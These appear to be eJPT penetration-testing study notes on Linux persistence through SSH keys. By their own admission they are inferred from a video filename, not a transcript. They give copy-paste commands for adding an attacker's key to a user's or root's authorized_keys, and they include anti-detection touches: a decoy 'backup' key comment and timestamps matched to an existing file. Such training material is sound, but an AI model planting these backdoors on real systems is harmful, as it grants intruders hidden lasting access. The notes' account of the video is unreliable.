# 01 - Persistence Via SSH Keys (02-LinuxPersistence)

Note: No transcript was provided. The following is a conservative, exam-focused summary inferred from the video filename and common eJPT/Linux persistence practices.

## What the video covers (Introduction / big picture)
- How to establish reliable Linux persistence by adding your public SSH key to a target’s authorized_keys.
- Ensuring the SSH service allows key-based auth, setting correct file permissions/ownership, and verifying access.
- Practical, minimal-footprint workflow you can reproduce during an engagement and clean up afterward.

## Flow (ordered)
1. Verify SSH server is installed, running, and reachable (port 22 or custom).
2. Generate an SSH key pair on your attack box (Ed25519 or RSA).
3. Place your public key into the target user’s ~/.ssh/authorized_keys (or root’s for privileged persistence).
4. Fix permissions and ownership so sshd accepts the key.
5. Test key-based login from your box.
6. Optional: minor OPSEC steps (generic comment, timestamps).
7. Clean up after the engagement.

## Tools highlighted
- ssh, sshd
- ssh-keygen, ssh-copy-id
- systemctl, ss/netstat
- mkdir, chmod, chown, tee/echo, cat
- tail, journalctl
- restorecon (SELinux systems)
- ufw/iptables (firewall checks)

## Typical command walkthrough (detailed, copy-paste friendly)

Replace placeholders in ALL_CAPS: TARGET, USER, TARGET_PORT, YOUR_PUBKEY, KEYFILE.

1) Check SSH service and port
```
# Service status (Debian/Ubuntu often 'ssh', RHEL-like often 'sshd')
sudo systemctl status ssh || sudo systemctl status sshd

# Start and enable if needed
sudo systemctl enable --now ssh || sudo systemctl enable --now sshd

# Confirm listener
sudo ss -tulpn | grep sshd || sudo netstat -tulpen | grep ssh

# Check configured port (default 22)
sudo grep -Ei '^\s*Port\s+' /etc/ssh/sshd_config || echo "Default port likely 22"
```

2) Generate an SSH key pair on your attack box
```
# Recommended (fast, modern)
ssh-keygen -t ed25519 -C "backup" -f ~/.ssh/KEYFILE -N ""

# If Ed25519 not supported by server, fall back to RSA 2048
ssh-keygen -t rsa -b 2048 -C "backup" -f ~/.ssh/KEYFILE -N ""
```

3A) If you have SSH password access to USER on TARGET
```
# Copies your public key to remote authorized_keys (creates .ssh as needed)
ssh-copy-id -i ~/.ssh/KEYFILE.pub -p TARGET_PORT USER@TARGET
```

3B) If you have a shell on TARGET (reverse shell/local)
```
# As USER (adjust home if needed)
mkdir -p ~/.ssh && chmod 700 ~/.ssh

# Paste your public key into authorized_keys (one line)
echo 'YOUR_PUBKEY' >> ~/.ssh/authorized_keys

chmod 600 ~/.ssh/authorized_keys
chown -R "$(id -u -n)":"$(id -g -n)" ~/.ssh

# SELinux systems (optional but recommended)
command -v restorecon >/dev/null 2>&1 && restorecon -Rv ~/.ssh
```

3C) Persistence for root (requires root shell or sudo)
```
sudo -s
mkdir -p /root/.ssh && chmod 700 /root/.ssh
echo 'YOUR_PUBKEY' >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys
chown -R root:root /root/.ssh
command -v restorecon >/dev/null 2>&1 && restorecon -Rv /root/.ssh
```

4) Ensure sshd accepts key auth
```
# Confirm PubkeyAuthentication is enabled
sudo grep -Ei '^\s*PubkeyAuthentication\s+yes' /etc/ssh/sshd_config || echo "Consider enabling PubkeyAuthentication yes"

# If you changed config, reload
sudo systemctl reload ssh || sudo systemctl reload sshd
```

5) Test login from your attack box
```
ssh -i ~/.ssh/KEYFILE -p TARGET_PORT -o IdentitiesOnly=yes -o StrictHostKeyChecking=no USER@TARGET

# If multiple keys loaded, forcing publickey only can help diagnose:
ssh -i ~/.ssh/KEYFILE -p TARGET_PORT -o PreferredAuthentications=publickey -o PubkeyAuthentication=yes USER@TARGET
```

6) Troubleshooting
```
# On target (Debian/Ubuntu)
sudo tail -n 50 /var/log/auth.log | grep -Ei 'sshd|publickey|auth'

# On target (RHEL/CentOS/Fedora)
sudo tail -n 50 /var/log/secure | grep -Ei 'sshd|publickey|auth'

# Live journal view
sudo journalctl -u ssh -f || sudo journalctl -u sshd -f

# Common permission fixes (on target)
chmod 700 ~/.ssh
chmod 600 ~/.ssh/authorized_keys
chown -R USER:USER ~/.ssh
```

7) Optional OPSEC niceties
```
# Use a generic key comment at generation: -C "backup"
# Match timestamps to reduce noise (example: align with ~/.bashrc)
touch -r ~/.bashrc ~/.ssh ~/.ssh/authorized_keys
```

8) Cleanup (post-engagement)
```
# Remove your key line safely
sed -i.bak '/YOUR_PUBKEY_CONTENT_SNIPPET/d' ~/.ssh/authorized_keys

# If no keys remain, you may optionally remove the file/dir (be careful)
[ ! -s ~/.ssh/authorized_keys ] && rm -f ~/.ssh/authorized_keys
[ -z "$(ls -A ~/.ssh 2>/dev/null)" ] && rmdir ~/.ssh || true
```

## Practical tips
- Permissions matter: ~/.ssh must be 700 and authorized_keys must be 600; ownership must match the user. SSH refuses to use looser perms.
- Keep key types compatible: Ed25519 preferred; fall back to RSA 2048 if needed.
- If root login is disabled, persist into a sudo-capable user. Modifying sshd_config (e.g., PermitRootLogin) is noisier and riskier.
- Ensure the SSH service is running and the port is reachable; check host firewalls (ufw/iptables) and security groups if applicable.
- Use -o IdentitiesOnly=yes to force ssh to use your specified key, avoiding confusion with other keys in your agent.
- On SELinux systems, restore file contexts with restorecon after creating ~/.ssh.
- Verify with logs: You should see “Accepted publickey” events for your user.
- Keep your private key secure; consider a separate key just for the lab to minimize exposure.

## Minimal cheat sheet (one-screen flow)
```
# 1) Generate key (attacker)
ssh-keygen -t ed25519 -C "backup" -f ~/.ssh/KEYFILE -N ""

# 2) Ensure sshd is up (target)
sudo systemctl enable --now ssh || sudo systemctl enable --now sshd
sudo ss -tulpn | grep sshd

# 3) Add key (target shell)
mkdir -p ~/.ssh && chmod 700 ~/.ssh
echo 'YOUR_PUBKEY' >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
chown -R USER:USER ~/.ssh
command -v restorecon >/dev/null 2>&1 && restorecon -Rv ~/.ssh

# 4) Test (attacker)
ssh -i ~/.ssh/KEYFILE -o IdentitiesOnly=yes -o StrictHostKeyChecking=no USER@TARGET -p 22

# 5) Troubleshoot (target)
sudo tail -n 50 /var/log/auth.log | grep sshd || sudo tail -n 50 /var/log/secure | grep sshd
```

## Summary
- Persistence via SSH keys is straightforward and stable: generate a key, ensure sshd is running, append your public key to the target user’s authorized_keys, set correct permissions/ownership, and verify login.
- Focus on correctness (permissions, ownership, service status) and compatibility (key type). Use logs for rapid troubleshooting.
- Keep changes minimal and reversible; clean up by removing your key after the engagement.